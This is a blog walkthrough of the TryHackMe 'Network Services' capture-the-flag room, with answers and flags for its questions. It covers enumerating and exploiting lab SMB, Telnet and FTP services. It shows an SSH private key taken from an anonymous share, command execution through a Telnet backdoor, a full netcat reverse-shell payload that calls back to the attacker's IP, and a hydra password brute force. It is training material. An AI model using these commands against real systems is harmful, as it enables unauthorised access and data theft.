---
title: TryHackMe - Network Services
description: Learn about, then enumerate and exploit a variety of network services and misconfigurations.
date: 2024-05-14 18:25:00 -0500
categories:
  - Security
  - TryHackMe
tags:
  - security
  - tryhackme
  - walkthrough
  - networking
  - protocol
published: true
media_subpath: /assets/
---

![[thm-network-services-banner.png|640]]

Cover Image by [BiZkettE1](https://www.freepik.com/free-vector/modern-business-background-with-geometric-shapes_5287944.htm) on Freepik

[TryHackMe - Network Services](https://tryhackme.com/r/room/networkservices)

In this room, we will learn about SMB, Telnet and FTP. We will also explore how we can enumerate these services and exploit them in CTFs.

> [!INFO]  
> It is strongly recommended to go through the reading material that accompanies each task before reading this guide. This article will only include the content necessary to answer the questions.

## SMB

### Task 2: Understanding SMB

![[ns-smb-1.png|640]]

**1. What does SMB stand for?**

> Server Message Block

**2. What type of protocol is SMB?**

> response-request

**3. What do clients connect to servers using?**

> TCP/IP

![[ns-smb-2.png|640]]

**4. What systems does Samba run on?**

> Samba

### Task 3: Enumerating SMB

**1. Conduct an Nmap scan of your choosing, How many ports are open?**

![[ns-smb-3.png|500]]

```bash
sudo nmap -sS -T4 -A -p- 10.10.44.59 -oN nmap_smb.txt
```

`-sS`: Stealth Scan (Uses partial TCP handshake)  
`-A`: Aggressive Scan (Service Versioning, OS Detection and Default Nmap Scripts)  
`-T4`: Timing Template (Aggressive) - Faster Scan  
`-p-`: Scan all 65,535 ports  
`-oN`: Save result as Text (Normal Output)

> 3

**2. What ports is SMB running on?**

The target is running Linux. So instead of SMB, we will see Samba.

> 139/445

**3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?**

The answers to the below question can also be found using Nmap Aggressive Scan.

```bash
enum4linux -a 10.10.44.59
```

`-a`: All Enumerations

![[ns-smb-4.png|500]]

> WORKGROUP

**4. What comes up as the name of the machine?**

> POLOSMB

**5. What operating system version is running?**

> 6.1

**6. What share sticks out as something we might want to investigate?**

`IPC$` and `print$` are default SMB shares. `netlogon` is a share that belongs to the Network Login service. By process of elimination, the share that sticks out is `profiles`.

![[ns-smb-5.png|500]]

> profiles

### Task 4: Exploiting SMB

**1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?**

> smbclient //10.10.10.2/secret -U suit

**2. Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (SMB) and a suspected vulnerability.**

> No answer needed

**3. Let's see if our interesting share has been configured to allow anonymous access, i.e. it doesn't require authentication to view the files. We can do this easily by:**  
**Using the username "Anonymous"**  
**Connecting to the share we found during the enumeration stage**  
**and not supplying a password.**  
**Does the share allow anonymous access? (Y/N)**

![[ns-smb-6.png|460]]

```bash
smbclient //10.10.44.59/profiles -U Anonymous
```

`-U`: SMB Username

> Y

**4. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?**

The file that stands out is "Working From Home Information.txt". Using the `more` command the content of the file can be read.

```bash
more "Working From Home Information.txt"
```

![[ns-smb-7.png|560]]

> John Cactus

**5. What service has been configured to allow him to work from home?**

> SSH

**6. Okay! Now we know this, what directory on the share should we look in?**  

SSH keys are stored in the `.ssh` directory. By default the public key of the server is saved in a file called `id_rsa` and the public key is stored in a file called `id_rsa.pub`. To connect to the server we require its private key. Since we do not know the SSH username for John Cactus I downloaded the public key as the public key will contain the SSH username. 

Multiple files can be downloaded from an SMB server using the `mget` command.

```bash
mget id_rsa id_rsa.pub
```

![[ns-smb-8.png|600]]

> .ssh

**7. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?**  

> id_rsa

**8. Download this file to your local machine, and change the permissions to "600" using "chmod 600 \[file\]". Then, use the information you have already gathered to work out the username of the account. Then, use the service and key to log in to the server.  
What is the smb.txt flag?**

```bash
# Change the Permission on SSH key
sudo chmod 600 id_rsa
# SSH connection using the SSH key
ssh cactus@10.10.44.59 -i id_rsa

cat smb.txt
```

![[ns-smb-9.png|640]]

> THM{smb_is_fun_eh?}

## Telent

### Task 5: Understanding Telnet

![[ns-telnet-1.png|640]]

**1. What is Telnet?**

> Application Protocol

**2. What has slowly replaced Telnet?**

> SSH

**3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?**

> telnet 10.10.10.3 23

**4. The lack of what means that all Telnet communication is in plaintext.**

> Encryption

### Task 6: Enumerating Telnet

**1. How many ports are open on the target machine?**

![[ns-telnet-2.png|640]]

```bash
sudo nmap -sS -T4 -A -p- 10.10.127.187 -oN nmap_telnet.txt
```

> 1

**2. What port is this?**

> 8012

**3. This port is unassigned, but still lists the protocol it's using, what protocol is this?**

> TCP

**4. Now re-run the Nmap scan, without the -p- tag, how many ports show up as open?**

When `-p-` is not used Nmap only scans the top 1000 ports.

![[ns-telnet-3.png|520]]

> 0

**5. Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or the top 1000 ports, that Nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.**

> No answer needed

**6. Based on the title returned to us, what do we think this port could be used for?**

The message returned by port 8012 tells us it's running Skidy's Backdoor.

> A Backdoor

**7. Who could it belong to? Gathering possible usernames is an important step in enumeration.**

> Skidy

**8. Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.**

> No answer needed

### Task 7: Exploiting Telnet

**1. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.**

![[ns-telnet-5.png|400]]

```bash
telnet 10.10.127.187 8012
```

> No answer needed

**2. Great! It's an open telnet connection! What welcome message do we receive?**

> SKIDY'S BACKDOOR.

**3. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)**

The HELP menu tells us to prepend all commands with `.RUN`. I tried running Linux commands prefixed with `.RUN` but we don't get any output.

> N

**4. Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.**

> No answer needed

**5. Start a tcpdump listener on your local machine.**

**If using your own machine with the OpenVPN connection, use:**  
`sudo tcpdump ip proto \\icmp -i tun0`  
**If using the AttackBox, use:**  
`sudo tcpdump ip proto \\icmp -i ens5`

**This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.**

This command needs to be executed from a new terminal. Do not close the terminal that has the telnet connection.

![[ns-telnet-4.png|540]]

```bash
sudo tcpdump ip proto \\icmp -i tun0
```

`ip proto \\icmp`: Capture packets that use the ICMP protocol (Filer Expression)  
`-i`: Capture packets from a specific interface

> No answer needed

**6. Now, use the command "ping \[local THM ip\] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, that you need to preface this with .RUN (Y/N)**

Run the ping command from the terminal in which you have the telnet connection. Remember to prefix the command with `.RUN`.

```bash
.RUN ping 10.6.67.160 -c 1
```

Once the command is executed check the terminal in which `tcpdump` is running. It should have listed the ICMP packets.

> Y

**7. Great! This means that we can execute system commands AND that we can reach our local machine. Now let's have some fun!**

> No answer needed

**8. We're going to generate a reverse shell payload using msfvenom.**  

**This will generate and encode a netcat reverse shell for us. Here's our syntax:**  
**"msfvenom -p cmd/unix/reverse_netcat lhost=\[local tun0 ip\] lport=4444 R"**  

**-p: payload  
lhost: our local host IP address (this is your machine's IP address)  
lport: the port to listen on (this is the port on your machine)  
R: export the payload in raw format**  

**What word does the generated payload start with?**

The payload will set up a reverse shell. In a reverse shell, the target machine initiates the network connection with the attacking machine. Since the shell has to connect with our machine we need the IP address of our machine on the TryHackMe network. If you have used OpenVPN to connect to TryHackMe you need to look under the `tun0` interface.

```bash
ip a l tun0
```

The value under `inet` is the IP address we required.

![[ns-telnet-6.png|600]]

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.6.67.160 lport=4444 R
```

![[ns-telnet-7.png|600]]

The last line of the output is the generated payload.

```bash
mkfifo /tmp/gewdh; nc 10.6.67.160 4444 0</tmp/gewdh | /bin/sh >/tmp/gewdh 2>&1; rm /tmp/gewdh
```

> mkfifo

**9. Perfect. We're nearly there. Now all we need to do is start a Netcat listener on our local machine. We do this using: "nc -lvp \[listening port\]"  
What would the command look like for the listening port we selected in our payload?**

In a new terminal run the below command. The terminal that has `tcpdump` running can be closed.

```bash
netcat -nvlp 4444
```

`-n`: No DNS Resolution  
`-v`: Verbose Output  
`-l`: Listen Mode  
`-p`: Listener Port

![[ns-telnet-8.png|400]]

> nc -lvp 4444

**10. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!**

Run the payload generated by `msfvenom` on the terminal which is connected to telnet. Remember to prefix the command with `.RUN`. If the command is executed correctly you will receive a connection on the Netcat listener.

![[ns-telnet-9.png|400]]

> No answer required

**11. Success! What is the contents of flag.txt?**

> THM{y0u_g0t_th3_t3ln3t_fl4g}

## FTP

### Task 8: Understanding FTP

![[ns-ftp-1.png|640]]

**1. What communications model does FTP use?**

> client-server

**2. What's the standard FTP port?**

> 21

**3. How many modes of FTP connection are there?**

> 2

### Task 9: Enumerating FTP

**1. Run an Nmap scan of your choice. How many ports are open on the target machine?**

![[ns-ftp-2.png|540]]

```bash
sudo nmap -sS -T4 -sV -p- 10.10.153.167 -oN nmap_ftp.txt
```

> [!NOTE]  
> You may have to run the scan multiple times for this machine. When I performed the scan using the `-A` flag Nmap reported that only 1 port was open.

> 2

**2. What port is FTP running on?**

> 21

**3. What variant of FTP is running on it?**

> vsftpd

**4. Great, now we know what type of FTP server we're dealing with we can check to see if we can login anonymously to the FTP server. We can do this using by typing "ftp \[IP\]" into the console, and entering "anonymous", and no password when prompted.  
What is the name of the file in the anonymous FTP directory?**

```bash
ftp 10.10.153.167
```

![[ns-ftp-3.png|460]]

> PUBLIC_NOTICE.txt

**5. What do we think a possible username could be?**

The content of the file can be read using the `more` command.

```bash
more PUBLIC_NOTICE.txt
```

![[ns-ftp-4.png|260]]

> Mike

**6. Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...**

> No answer needed

### Task 10: Exploiting FTP

**1. What is the password for the user "mike"?**

![[ns-ftp-5.png|640]]

```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -f -v 10.10.153.167 ftp
```

`-t`: No. of threads (Parallelism)  
`-l`: Username  
`-P`: Password Wordlist  
`-f`: Stop when 1st match is found  
`-v`: Verbose Mode

>password

**2. Bingo! Now, let's connect to the FTP server as this user using "ftp \[IP\]" and entering the credentials when prompted**

```bash
ftp 10.10.153.167
```

![[ns-ftp-6.png|420]]

> No answer needed

**3. What is ftp.txt?**

> THM{y0u_g0t_th3_ftp_fl4g}
